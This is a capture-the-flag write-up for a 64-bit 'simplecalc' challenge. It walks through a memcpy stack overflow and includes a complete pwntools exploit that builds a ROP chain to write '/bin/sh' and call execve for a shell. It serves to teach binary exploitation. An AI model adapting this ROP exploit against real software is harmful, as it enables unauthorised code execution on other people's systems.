# Simplecalc (pwn)

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/33bfe440-3885-4b4b-9876-7bcf75b07b45)  
Take note of the NX bit. That means that we can no longer use shellcode.  
Time to have fun with ROP! :D   

Running the program, it seems to be a calculator, as the name implies  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/9d298758-c2c6-4996-bb57-dfcf7e60971b)  

Let's open it up in ghidra and see what we find.  

```c

undefined8 main(void)

{
  undefined buf [40];
  int menu_choice;
  int n_calcs;
  int *results;
  int i;
  
  n_calcs = 0;
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  print_motd();
  printf("Expected number of calculations: ");
  __isoc99_scanf(&%d,&n_calcs);
  handle_newline();
  if ((n_calcs < 0x100) && (3 < n_calcs)) {
    results = (int *)malloc((long)(n_calcs << 2));
    for (i = 0; i < n_calcs; i = i + 1) {
      print_menu();
      __isoc99_scanf(&%d,&menu_choice);
      handle_newline();
      if (menu_choice == 1) {
        adds();
        results[i] = add_result;
      }
      else if (menu_choice == 2) {
        subs();
        results[i] = sub_result;
      }
      else if (menu_choice == 3) {
        muls();
        results[i] = mult_result;
      }
      else if (menu_choice == 4) {
        divs();
        results[i] = div_result;
      }
      else {
        if (menu_choice == 5) {
          memcpy(buf,results,(long)(n_calcs << 2));
          free(results);
          return 0;
        }
        puts("Invalid option.\n");
      }
    }
    free(results);
  }
  else {
    puts("Invalid number.");
  }
  return 0;
}
```

Can you see it?
```c
--> buf[40];
...
--> results = (int *)malloc((long)(n_calcs << 2));
...
--> memcpy(buf, results,(long)(n_calcs << 2));
```

So we dynamically allocate a buffer to hold the results of our calculations, and then we copy them over to a buffer of static size...
We finally see an exploit that doesn't abuse `gets` :)
This is going to be fun.  

## Exploitation  

first we want to figure out the offset between the buffer and the return address so that we know how much data to write  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/e0764f19-f77c-4306-a23c-a8bb098bcdff)  
Therefore we need to write 18 integers worth of data before we reach the return address.  

### Writing to memory  

Now, before we do anything we have to figure out how we are going to write data into memory.
Since what we are writing are the results of our calculations, we have to use the functions to make sure the result of our calculations are the correct values.  
Also, we are writing integers (4 bytes), whereas our addresses and registers are 64 bits (8 bytes).  
That means that we need to separate the high bits from the low bits and write them separately such that in memory we have the correct 64 bit value.

```python
def write(addr, io = io):   
    #extract higher and lower bits
    upperbits = (addr >> 32) & 0xffffffff
    lowerbits = addr & 0xffffffff

    # using the sub function to write

    n1 = 0x28 + lowerbits
    n2 = 0x28
    io.sendline(b'2')
    io.sendline(bytes(str(n1),'ascii'))
    io.sendline(bytes(str(n2),'ascii'))

    n1 = 0x28 + upperbits
    n2 = 0x28
    io.sendline(b'2')
    io.sendline(bytes(str(n1),'ascii'))
    io.sendline(bytes(str(n2),'ascii'))

    log.info('Wrote the bytes '+hex(addr))
```

We can know propery write to memory! :)  
Now we need to think what we are going to write.  
Since NX is enabled we can't use shellcode. Also, this binary is statically linked, so there is no `system()` function to jump to.  
Therefore we need to use ROP, in our case to use the `execve` syscall to get a shell.  

### Calling execve  
To call `execve` we need to have the following values in our registers before doing a syscall
```
rax = 59 // the syscall number for execve
rdi = pointer to /bin/sh
rsi = 0
rdx = 0
```
Using ROP, specifically `POP reg` instructions, we can easily populate the registers with any value we desire.  
However, there is no `/bin/sh` string in memory, so we have to write it into memory ourselves.  

My first thought was to write it into the stack, together with our payload, but ASLR would not make that easy.  
However I found this gadget: `mov qword ptr [rdx], rax; pop rbx; ret;`  
With this gadget I can write an arbitrary value (in rax) to an arbitrary address (in rdx), so the plan is to use this gadget to write `/bin/sh` into memory.  
Looking at the virtual memory map I decided to write into the data section because it has the correct permissions.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/f1bc9951-c1fa-4e9c-b045-c266738adf10)  

After that I will just ROP to populate the registers with the desired values and then make a syscall to receive my shell.  

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template simplecalc
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'simplecalc')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

padding_ints = 18

def write(addr, io = io):   
    #extract higher and lower bits
    upperbits = (addr >> 32) & 0xffffffff
    lowerbits = addr & 0xffffffff

    # using the sub function to write 

    n1 = 0x28 + lowerbits
    n2 = 0x28
    io.sendline(b'2')
    io.sendline(bytes(str(n1),'ascii'))
    io.sendline(bytes(str(n2),'ascii'))

    n1 = 0x28 + upperbits
    n2 = 0x28
    io.sendline(b'2')
    io.sendline(bytes(str(n1),'ascii'))
    io.sendline(bytes(str(n2),'ascii'))

    log.info('Wrote the bytes '+hex(addr))

def write_zero(io=io):
    io.sendline(b'2')
    io.sendline(b'256')
    io.sendline(b'256')
    io.sendline(b'2')
    io.sendline(b'256')
    io.sendline(b'256')
    log.info('Wrote 0')


# we want to execute execve
# rax = 59
# rdi = pointer to /bin/sh
# rsi = 0
# rdx = 0

rop = ROP(exe)

# start of data section 0x6c0000 <-- here we will write /bin/sh

# 0x000000000047efa4: mov qword ptr [rdx], rax; pop rbx; ret;

mov_qword_ptr = 0x47efa4
write_addr = 0x6c0000
binsh_string = int.from_bytes(b'/bin/sh','little')

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI = (rop.find_gadget(['pop rsi', 'ret']))[0]
POP_RDX = (rop.find_gadget(['pop rdx', 'ret']))[0]
POP_RAX = (rop.find_gadget(['pop rax', 'ret']))[0]
SYSCALL = (rop.find_gadget(['syscall']))[0]

num_writes = b'100'
io.sendline(num_writes)

#padding
for i in range(padding_ints//2): #we write two ints per function call
    write_zero()

# write /bin/sh to memory
write(POP_RAX)
write(binsh_string)
write(POP_RDX)
write(write_addr)
write(mov_qword_ptr)
write_zero()

# call execve
write(POP_RAX)
write(59)
write(POP_RDI)
write(write_addr)
write(POP_RDX)
write_zero()
write(POP_RSI)
write_zero()
write(SYSCALL)

io.sendline(b'5')

io.clean()
io.interactive()
```
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/10eac3f7-9ea4-4222-b081-0771bef93c78)






